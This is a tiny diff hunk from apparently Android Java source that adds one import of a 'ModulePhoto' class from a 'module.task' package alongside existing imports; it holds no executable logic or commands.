@@ -14,6 +14,7 @@ import java.util.Hashtable;
 
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.interfaces.AbstractFactory;
+import com.android.dvci.module.task.ModulePhoto;
 import com.android.dvci.util.Check;
 import com.android.mm.M;
 
